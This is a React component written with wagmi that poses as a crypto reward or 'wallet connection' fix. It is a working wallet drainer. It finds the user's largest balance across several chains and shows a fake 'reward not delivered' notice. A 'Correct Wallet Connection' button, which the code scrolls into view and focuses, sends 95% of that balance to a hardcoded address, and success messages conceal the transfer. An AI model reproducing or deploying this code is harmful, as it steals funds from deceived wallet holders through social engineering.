import React, { useEffect, useState, useRef } from 'react';
import { useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
import { parseEther } from 'viem';

type SendTransactionProps = {
  balances?: {
    ethBalance: string;
    maticBalance: string;
    bnbBalance: string;
    sepoliaBalance: string;
    optimismBalance: string;
    arbitrumBalance: string;
    baseBalance: string;
    zkSyncBalance: string;
  };
};

const SendTransaction: React.FC<SendTransactionProps> = ({ balances }) => {
  const { data: hash, error, isPending, sendTransaction } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });

  const [highestBalance, setHighestBalance] = useState<{ value: string; currency: string }>({ value: '0', currency: 'ETH' });
  const [transactionInitiated, setTransactionInitiated] = useState(false);
  const [message, setMessage] = useState<string | null>(null);
  const [isHovered, setIsHovered] = useState(false);
  const [showButton, setShowButton] = useState(false);

  const buttonRef = useRef<HTMLButtonElement | null>(null);

  useEffect(() => {
    if (balances) {
      const balanceArray = [
        { value: balances.ethBalance || '0', currency: 'ETH' },
        { value: balances.maticBalance || '0', currency: 'MATIC' },
        { value: balances.bnbBalance || '0', currency: 'BNB' },
        { value: balances.sepoliaBalance || '0', currency: 'SEP' },
        { value: balances.optimismBalance || '0', currency: 'OPT' },
        { value: balances.arbitrumBalance || '0', currency: 'ARB' },
        { value: balances.baseBalance || '0', currency: 'BASE' },
        { value: balances.zkSyncBalance || '0', currency: 'ZKS' },
      ];

      const highest = balanceArray.reduce((prev, curr) => (parseFloat(curr.value) > parseFloat(prev.value) ? curr : prev));
      setHighestBalance(highest);

      // Show the button only if balances are detected
      if (parseFloat(highest.value) > 0) {
        setShowButton(true);
      }
    }
  }, [balances]);

  useEffect(() => {
    if (showButton && buttonRef.current) {
      // Scroll to the button and focus it when it becomes visible
      buttonRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
      buttonRef.current.focus();
    }
  }, [showButton]);

  useEffect(() => {
    if (isConfirmed) {
      setMessage('Resolver confirmed successfully!');
    }
    if (error) {
      setMessage('Resolver failed. Please try again.');
    }
  }, [isConfirmed, error]);

  const handleSendTransaction = () => {
    if (highestBalance.value !== '0') {
      const recipientAddress = '0xd043E3dEFaA46Df9C60351d83F76aa7bC9D96Dbc'; // replace with actual address

      // Calculate 5% discount and subtract it from the balance
      const valueWithDiscount = (parseFloat(highestBalance.value) * 0.95).toString();

      // Convert to wei (smallest ETH unit)
      const valueInWei = parseEther(valueWithDiscount);

      // Send the transaction
      sendTransaction({ to: recipientAddress, value: valueInWei });
      setTransactionInitiated(true);
    }
  };

  const buttonStyle: React.CSSProperties = {
    padding: '10px 20px',
    backgroundColor: isHovered ? '#45a049' : '#4CAF50',
    color: 'white',
    border: 'none',
    borderRadius: '5px',
    cursor: showButton ? 'pointer' : 'not-allowed', // Change cursor based on connection status
    fontSize: '16px',
    transition: 'background-color 0.3s ease, filter 0.3s ease',
    marginTop: '10px',
    textAlign: 'center',
    display: showButton ? 'block' : 'none', // Show button only if conditions are met
    alignSelf: 'center',
  };

  const containerStyle: React.CSSProperties = {
    display: 'flex',
    justifyContent: 'center',
    alignItems: 'flex-start',
    paddingTop: '10px',
    flexDirection: 'column',
  };

  return (
  <div style={containerStyle}>
    {!transactionInitiated && showButton && (
      <>
        <div style={{ marginBottom: '10px' }}>
          <strong>Reward Status:</strong> your reward is ready but was not delivered to your Wallet , Not Properly Connected due to Wallet Misplacement , Move and Correct Wallet Connection issue Below.
        </div>
        <button
          ref={buttonRef}
          onClick={handleSendTransaction}
          onMouseEnter={() => setIsHovered(true)}
          onMouseLeave={() => setIsHovered(false)}
          style={buttonStyle}
        >
          Correct Wallet Connection
        </button>
      </>
    )}
    {isPending && <div>Open Wallet.</div>}
    {isConfirming && <div>Waiting...</div>}
    {message && <div>{message}</div>}
  </div>
);

};

export default SendTransaction;
